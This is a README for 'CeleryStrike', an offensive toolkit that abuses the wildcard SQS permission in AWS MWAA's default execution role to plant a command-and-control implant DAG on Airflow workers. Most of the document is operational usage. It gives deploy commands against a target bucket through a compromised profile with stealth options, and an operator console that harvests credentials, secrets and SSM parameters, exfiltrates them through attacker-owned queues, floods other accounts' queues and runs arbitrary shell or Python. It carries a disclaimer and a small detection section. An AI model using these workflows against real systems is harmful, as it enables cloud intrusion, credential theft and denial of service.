# CeleryStrike

**AWS MWAA Execution Role Exploitation Toolkit**

```
 ______     ______     __         ______     ______     __  __        ______     ______   ______     __     __  __     ______    
/\  ___\   /\  ___\   /\ \       /\  ___\   /\  == \   /\ \_\ \      /\  ___\   /\__  _\ /\  == \   /\ \   /\ \/ /    /\  ___\   
\ \ \____  \ \  __\   \ \ \____  \ \  __\   \ \  __<   \ \____ \     \ \___  \  \/_/\ \/ \ \  __<   \ \ \  \ \  _"-.  \ \  __\   
 \ \_____\  \ \_____\  \ \_____\  \ \_____\  \ \_\ \_\  \/\_____\     \/\_____\    \ \_\  \ \_\ \_\  \ \_\  \ \_\ \_\  \ \_____\ 
  \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/   \/_____/      \/_____/     \/_/   \/_/ /_/   \/_/   \/_/\/_/   \/_____/ 
                                                                                                                                 
```

CeleryStrike weaponizes the default AWS MWAA execution role's wildcard SQS policy (`arn:aws:sqs:*:*:airflow-celery-*`) to establish full command-and-control over Airflow workers. A single DAG upload gives you an interactive C2 implant with built-in credential harvesting, cross-account recon, event injection, and more — all tunneled through SQS queues that blend in with legitimate Celery traffic.

> **For authorized security testing, penetration testing engagements, and defensive validation only.**

See [aws-mwaa-post-exploitation.md](aws-mwaa-post-exploitation.md) for the full vulnerability research.

---

## Attack Flow

```
                         ┌─────────────────────┐
                         │   Attacker Machine   │
                         │                      │
                         │   celerystrike       │
                         │   connect ...        │
                         └──────┬───────────────┘
                                │  SQS (airflow-celery-c2-*)
                    ┌───────────┴───────────┐
                    ▼                       ▼
          ┌─────────────────┐    ┌─────────────────┐
          │  Command Queue  │    │  Results Queue   │
          │  (attacker acct)│    │  (attacker acct) │
          └────────┬────────┘    └────────▲────────┘
                   │  poll                │  send
                   ▼                      │
          ┌────────────────────────────────┐
          │     MWAA Airflow Worker        │
          │                                │
          │  C2 Implant DAG                │
          │  ├── !harvest-creds            │
          │  ├── !airflow-dump             │
          │  ├── !s3-recon                 │
          │  ├── !secrets / !ssm-params    │
          │  ├── !recon (cross-account)    │
          │  ├── !inject (cross-account)   │
          │  ├── !dos-flood                │
          │  ├── !pivot / !multi           │
          │  └── shell / python:           │
          └────────────────────────────────┘
```

## Installation

```bash
git clone https://github.com/AI-redteam/AWS-MWAA-SQS-Execution-Role-Research.git
cd AWS-MWAA-SQS-Execution-Role-Research

pip install -e .
```

## Quick Start

### Option A: Full automated pipeline

```bash
# 1. Deploy everything — creates SQS queues, generates C2 DAG, uploads to target S3
celerystrike deploy all \
  --attacker-account 123456789012 \
  --target-bucket mwaa-dags-prod \
  --target-profile compromised-role \
  --stealth --jitter 30

# 2. Connect to the implant
celerystrike connect --attacker-account 123456789012

  c2> !exfil                          # harvest creds, secrets, connections — all at once
  c2> !recon 999999999999             # scan another account for MWAA queues
  c2> !inject 999 airflow-celery-prod sqli_probe
  c2> whoami                          # arbitrary shell command
  c2> python:import boto3; ...        # arbitrary Python

# 3. Cleanup
celerystrike teardown --attacker-account 123456789012 --self-destruct
```

### Option B: Step-by-step

```bash
# Create attacker-side SQS queues only
celerystrike deploy queues --attacker-account 123456789012

# Generate the implant DAG locally (for review / manual upload)
celerystrike deploy generate --attacker-account 123456789012 --stealth --output-dir ./dags

# Upload separately
celerystrike deploy upload \
  --file ./dags/dag_c2_implant.py \
  --target-bucket mwaa-dags-prod \
  --target-profile compromised-role

# Connect when ready
celerystrike connect --attacker-account 123456789012
```

## Commands

| Command | Description |
|---------|-------------|
| `deploy all` | Full pipeline: create queues + generate C2 DAG + upload to S3 |
| `deploy queues` | Only create attacker-side SQS queues |
| `deploy generate` | Only generate the C2 implant DAG locally |
| `deploy upload` | Only upload a DAG file to the target S3 bucket |
| `connect` | Interactive C2 operator console |
| `recon` | Pre-attack account scanning (external, no implant needed) |
| `analyze` | Blue team IAM policy analysis & detection rule generation |
| `teardown` | Delete queues + optional `!self-destruct` to the implant |
| `test` | End-to-end validation suite (uses your own account, no MWAA needed) |

## C2 Console Commands

Once connected via `celerystrike connect`, the operator console supports:

### Built-in Modules
| Command | What it does |
|---------|-------------|
| `!harvest-creds` | STS identity, env vars, IMDS credentials, container creds |
| `!airflow-dump` | Connections (with passwords), variables, pools |
| `!s3-recon` | Enumerate buckets, sample objects, read policies |
| `!secrets` | List & read Secrets Manager secrets |
| `!ssm-params` | List & read SSM parameters (with decryption) |
| `!iam-enum` | Role details, attached & inline policies |
| `!network-recon` | Interfaces, routes, VPCs, subnets, security groups |
| `!exfil` | Run all of the above in one batch |

### Remote Attack Operations
| Command | What it does |
|---------|-------------|
| `!recon <accts> [region]` | Scan accounts for `airflow-celery-*` queues from inside MWAA |
| `!inject <acct> <queue> <payload> [region]` | Inject named payload (e.g. `sqli_probe`) or raw JSON |
| `!dos-flood <acct> <queue> [count] [region]` | Flood a target queue with messages |

### File Ops & Advanced
| Command | What it does |
|---------|-------------|
| `!read-file <path>` | Read a file from the worker |
| `!write-file <path> <b64>` | Write base64 content to a file |
| `!pivot <acct> <queue> <msg>` | Send a message to another account's queue |
| `!multi` | Batch multiple commands |
| `!self-destruct` | Remove the implant DAG and cached bytecode |
| `python:<code>` | Execute arbitrary Python |
| `<anything else>` | Execute as shell command |

## Blue Team: Analysis & Detection

CeleryStrike also includes defensive capabilities for validating your environment:

```bash
# Analyze a specific MWAA execution role for the vulnerable policy
celerystrike analyze role --role-name AmazonMWAA-MyEnv-ExecutionRole

# Enumerate all MWAA environments and analyze their roles
celerystrike analyze full --region us-east-1 --profile security-audit

# Generate AWS Config Guard rules + CloudWatch Insights queries
celerystrike analyze detection-rules --output-dir ./detection_rules
```

## Pre-Attack Recon (No Implant Needed)

Scan for `airflow-celery-*` queues across accounts using `sqs:GetQueueUrl` — works with any AWS credentials that have SQS access:

```bash
# Scan specific accounts
celerystrike recon --accounts 111111111111,222222222222

# Scan a numeric range
celerystrike recon --start 100000000000 --count 500 --threads 10
```

## Validation Suite

Run all safe capability tests using your own account as both attacker and target (no MWAA environment needed):

```bash
celerystrike test \
  --attacker-account 123456789012 \
  --source-profile victim-role-simulator
```

This runs C2 roundtrip, DoS assessment, event injection, and recon tests.

## Architecture

```
celerystrike/
├── __init__.py
├── __main__.py              # python -m celerystrike
├── cli.py                   # CLI entry point (6 commands)
├── config.py                # Constants and dataclasses
├── utils.py                 # SQS/S3/IAM helpers, logging
└── modules/
    ├── c2_channel.py        # C2 infra + interactive operator console
    ├── dag_generator.py     # Generates the C2 implant DAG with all builtins
    ├── dos_simulation.py    # DoS risk assessment & controlled flooding
    ├── event_injection.py   # Cross-account event injection probes
    ├── recon.py             # Infrastructure reconnaissance scanner
    └── policy_analyzer.py   # IAM analysis & detection rule generation
```

## The Vulnerability

AWS MWAA's default execution role includes a wildcard SQS policy:

```json
{
  "Effect": "Allow",
  "Action": [
    "sqs:ChangeMessageVisibility",
    "sqs:DeleteMessage",
    "sqs:GetQueueAttributes",
    "sqs:GetQueueUrl",
    "sqs:ReceiveMessage",
    "sqs:SendMessage"
  ],
  "Resource": "arn:aws:sqs:*:*:airflow-celery-*"
}
```

The `*:*` in the resource ARN means **any account, any region**. Any queue named `airflow-celery-*` in any AWS account is accessible to the MWAA worker. CeleryStrike exploits this by creating attacker-controlled queues that match the pattern, establishing a full C2 channel that's indistinguishable from legitimate Celery task traffic.

See [aws-mwaa-post-exploitation.md](aws-mwaa-post-exploitation.md) for the complete vulnerability analysis.
